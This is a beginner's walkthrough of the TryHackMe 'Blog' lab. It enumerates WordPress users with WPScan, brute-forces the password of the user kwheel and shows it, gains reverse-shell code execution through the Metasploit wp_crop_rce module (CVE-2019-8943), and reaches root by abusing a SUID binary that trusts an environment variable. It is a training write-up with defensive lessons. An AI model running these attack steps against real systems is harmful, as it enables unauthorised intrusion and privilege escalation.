---
layout: default
title: TryHackMe - Basic Pentesting
---
# TryHackMe – Blog Room Walkthrough 🧠💻


This write‑up explains **the full journey**, step by step, in very simple language, so that **beginners** can follow the logic, understand the concepts, and reuse the same methodology on other machines.

---

## 🗺️ Methodology Map (The Big Picture)

```
Reconnaissance
     ↓
Web Enumeration (WordPress)
     ↓
User Enumeration (WPScan)
     ↓
Password Brute‑Force (WPScan)
     ↓
Authenticated Access
     ↓
Remote Code Execution (Metasploit)
     ↓
Shell as www-data
     ↓
Privilege Enumeration
     ↓
SUID Binary Analysis
     ↓
Logic Flaw Exploitation
     ↓
ROOT ACCESS
```

This is a **real pentesting flow**, used in CTFs, TryHackMe, and certifications like **eJPT**.

---

## 1️⃣ Reconnaissance – Discovering the Target

The first thing we always do is **reconnaissance**.

From basic scanning and browsing, we discover:

* A web server is running
* The website uses **WordPress**

### Why WordPress Matters

WordPress is important because:

* It is extremely common
* It often leaks usernames
* Old versions frequently contain vulnerabilities
* Authentication can lead directly to code execution

At this point, we decide:

> 🎯 **The web application is our entry point**

---

## 2️⃣ WordPress Enumeration – Understanding the Application

Before attacking, we must understand the application.

Our questions:

* Which WordPress version is running?
* Are there valid users?
* Can authentication be abused?

To answer these, we use **WPScan**.

### What Is WPScan?

**WPScan** is a tool made specifically for WordPress security testing.

It can:

* Detect WordPress versions
* Enumerate users
* Find vulnerabilities
* Brute‑force logins

Think of it as:

> “Nmap, but only for WordPress.”

---

## 3️⃣ User Enumeration with WPScan

First, we look for valid usernames:

```bash
wpscan --url http://blog.thm --enumerate u
```

### Why This Step Is Critical

Password attacks **only work if the username exists**.

WPScan reveals multiple valid users, including:

* `kwheel`
* `bjoel`

Now we know:

> These accounts are real and can be attacked

---

## 4️⃣ Brute‑Forcing WordPress Credentials

With a confirmed username (`kwheel`), we attempt a password attack using a common wordlist.

```bash
wpscan --url http://blog.thm \
--usernames kwheel \
--passwords /usr/share/wordlists/rockyou.txt
```

### What Is Brute‑Forcing?

Brute‑forcing means:

* Trying many passwords automatically
* Until the correct one is found

This works here because:

* The password is weak
* There is no rate‑limiting

### Result

WPScan successfully finds:

* **Username:** `kwheel`
* **Password:** `cutiepie1`

🎉 **We now have valid WordPress credentials**

This is a major milestone.

---

## 5️⃣ Why Authentication Changes Everything

Logging in is not the end — it is the **beginning**.

Why?

* Many WordPress vulnerabilities require login
* WordPress 5.0 is vulnerable to **CVE‑2019‑8943**
* Authenticated users can upload or manipulate files

So our goal becomes:

> **Turn a WordPress login into code execution**

---

## 6️⃣ Remote Code Execution (RCE) with Metasploit

Instead of exploiting the vulnerability manually, we use **Metasploit**, which already contains a reliable module.

### What Is RCE?

**Remote Code Execution** means:

> Running our own commands on the target server

This is one of the most powerful vulnerabilities possible.

---

### Using Metasploit

```bash
msfconsole
use exploit/multi/http/wp_crop_rce
```

We configure it with the credentials we found:

```bash
set RHOSTS <TARGET_IP>
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST <YOUR_IP>
run
```

### What the Exploit Does (Conceptually)

1. Logs into WordPress as `kwheel`
2. Uploads a crafted image
3. Abuses WordPress image cropping
4. Injects PHP code
5. Executes it on the server
6. Sends a shell back to us

🎉 **Remote Code Execution achieved**

---

## 7️⃣ Getting a Proper Shell

The exploit gives us a **Meterpreter session**, which we convert into a normal shell.

We are now logged in as:

```
www-data
```

### What Is `www-data`?

* The user that runs web servers
* Very limited privileges
* Cannot access sensitive files

We are inside the system, but **not in control yet**.

---

## 8️⃣ Privilege Escalation – The Right Mindset

Now we ask the most important question in Linux hacking:

> **How can this user become root?**

We do not guess.
We enumerate.

---

## 9️⃣ Enumerating SUID Binaries

SUID binaries run with the **permissions of their owner**, often root.

```bash
find / -perm -4000 2>/dev/null
```

Most results are normal Linux binaries.

But one stands out:

```
/usr/sbin/checker
```

### Why This Is Suspicious

* Not a standard Linux binary
* Owned by root
* Has SUID enabled

🧠 **Custom SUID binaries are high‑value targets.**

---

## 🔟 Understanding the `checker` Program

We execute it:

```bash
checker
```

Output:

```
Not an Admin
```

This tells us:

* The program checks if the user is an "admin"
* But not *how* yet

---

## 1️⃣1️⃣ Environment Variables Explained (Beginner Friendly)

An **environment variable** is like a note you give to a program.

Example:

```bash
export test=hello
echo $test
```

Programs can read these notes.

⚠️ Important:

* Any user can create them
* SUID programs should never trust them

---

## 1️⃣2️⃣ The Vulnerability – A Logic Flaw

The `checker` program:

* Reads an environment variable called `admin`
* If it exists, it assumes the user is trusted

This is a **serious programming mistake**.

---

## 1️⃣3️⃣ Exploiting the Logic Flaw

We simply create the variable:

```bash
export admin=1
```

Then run the program again:

```bash
checker
```

### What Happens Internally

1. `checker` starts
2. Linux gives it **root privileges** (SUID)
3. It reads `admin`
4. It trusts it
5. It spawns a root shell

---

## 👑 Root Access Achieved

```bash
whoami
```

Output:

```
root
```

🎉 **Full system compromise**

---

## 🧠 Why This Worked (One Sentence)

> A root program trusted user‑controlled data to make a security decision.

---

## 🛡️ Defensive Lessons

To prevent this:

* Never trust environment variables in SUID programs
* Drop privileges early
* Validate all inputs securely

---

## 📌 Key Takeaways

* Enumeration beats guessing
* Weak passwords still matter
* Authentication often leads to RCE
* Logic bugs can be more dangerous than exploits
* Understanding concepts > memorizing commands

---

## 📄 TL;DR (For Recruiters)

* Successfully compromised a vulnerable **WordPress 5.0** application on TryHackMe
* Enumerated users and brute-forced credentials using **WPScan**
* Leveraged **authenticated WordPress RCE (CVE-2019-8943)** via Metasploit
* Obtained a shell as the low-privileged **www-data** user
* Performed Linux privilege enumeration and identified a **custom SUID binary**
* Discovered and exploited a **logic flaw involving trusted environment variables**
* Escalated privileges to **root** without kernel exploits
* Demonstrated strong understanding of **pentesting methodology, enumeration, and Linux internals**

---


